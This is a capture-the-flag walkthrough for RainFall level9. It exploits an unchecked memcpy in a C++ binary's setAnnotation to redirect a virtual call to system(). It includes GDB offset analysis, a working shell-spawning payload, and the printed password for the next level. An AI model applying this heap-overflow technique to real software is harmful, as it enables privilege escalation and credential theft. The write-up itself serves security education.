# Level9 Walkthrough

## Analyzing the Program with GDB or Ghidra

1. **Disassemble the program functions**:
    We can see a C++ program with a Class N and different methods, thanks to some commands:
    ```bash
    level9@RainFall:~$ c++filt _ZN1NC2Ei
    N::N(int)
    level9@RainFall:~$ c++filt _ZN1N13setAnnotationEPc
    N::setAnnotation(char*)
    level9@RainFall:~$ c++filt _Znwj
    operator new(unsigned int)
    ```
    They are calling classes and methods from classes

    - `setAnnotation(char*)` : use of memcpy to copy annotation without verifying the entry size of the user.
    - `operator+()` or `operator-()` : overload
    - `main` : the binary is written in cpp.

        - Lets `disas main`, we can see two dereferencing pointers :
    ```bash
       0x08048680 <+140>:   mov    (%eax),%eax
    => 0x08048682 <+142>:   mov    (%eax),%edx
    ```
    Ces instructions impliquent des objets ou des structures en mémoire. Ces objets contiennent des pointeurs vers leurs propres méthodes ou d'autres données.
    - +140 : La valeur de l'adresse pointée par eax est chargée dans eax. Cela signifie que eax contient un pointeur vers une zone mémoire, et cette zone est lue.
    - +142 : La valeur de l'adresse pointée par eax est chargée dans edx. Ici, eax est utilisé pour accéder à un autre pointeur, si on controle la valeur dans eax on peut rediriger le programme vers une addresse memoire arbitraire via edx. 

    ```bash
        [...]
        0x08048693 <+159>:   call   *%edx
    ```
    Un appel indirect est effectué via un pointeur stocké dans edx. Ce comportement est typique dans les programmes utilisant des tables de vtables pour les méthodes virtuelles.


    The main exploit is to replace the address pointed by `eax` to a `system` call. We'll need to write `system` address then put 104 bytes padding to overflow and the address of `eax` which is where we want to overwrite. We'll add the `/bin/sh` string to get a shell.


2. **Running the program to overflow it**:
    ```bash
    (gdb) r "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
    [...]
    Program received signal SIGSEGV, Segmentation fault.
    0x08048682 in main ()
    (gdb) info function system
    [...]
    0xb7d86060  system
    ```

    We can see `system` function after segfault. Before segfault, system (libc function) is not charge on memory, cuz system is a dynamic function. `system` is partially charged in memory, so with GDB we can see shared dynamic library (libc.so functions). 

    They are referenced on the `PLT` Procedure Linkage Table. 

    - We can also see the offset in the 108th position: 
    ```bash
    (gdb) info register eax
    eax            0x41366441       1094083649
    ```

    - Lets try to find where our buffer is stored (eax register where will point to)
    ```bash
    (gdb) b *0x8048677 <-----> Right after setAnnotation to manipulate %eax to point to a control address
    Breakpoint 1 at 0x8048677
    (gdb) r "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
    [...]
    Breakpoint 1, 0x08048677 in main ()
    (gdb) ni <-----> next instruction to go after
    0x0804867c in main ()
    (gdb) info register eax
    eax            0x804a00c        134520844
    (gdb) x/s 0x804a00c
    0x804a00c:       "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag" <-----> So we can write to it here something
    ```

## Running the program

1. **Execute the Program with the Correct Input**:

    Now we create our payload with the :
    - system_buffer = 4bytes
    - padding = 104 bytes (to reach memcpy)
    - buffer_addr = 4 bytes 
    Total = 108 + 4 = 112

    `\x60\x60\xd8\xb7` : from `0xb7d86060` system
    `\x0c\xa0\x04\x08`: from `0x0804a00c` eax register
    ```bash
    level9@RainFall:~$ ./level9 $(python -c 'print "\x60\x60\xd8\xb7" + "A" * 104 + "\x0c\xa0\x04\x08" + ";/bin/sh"')
    sh: 1: 
        : not found
    $ quit
    /bin/sh: 1: quit: not found
    $ exit
    level9@RainFall:~$ ./level9 $(python -c 'print "\x60\x60\xd8\xb7" + "A" * 104 + "\x0c\xa0\x04\x08" + ";/bin/sh"')
    sh: 1: 
        : not found
    $ whoami
    bonus0
    $ id
    uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
    $ cat /home/user/bonus0/.pass
    f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
    ```

## Moving to bonus0

1. **Swith User to bonus0**:
    Run ```su bonus0```

2. **Authenticate with the Password**:
    We used the password we found.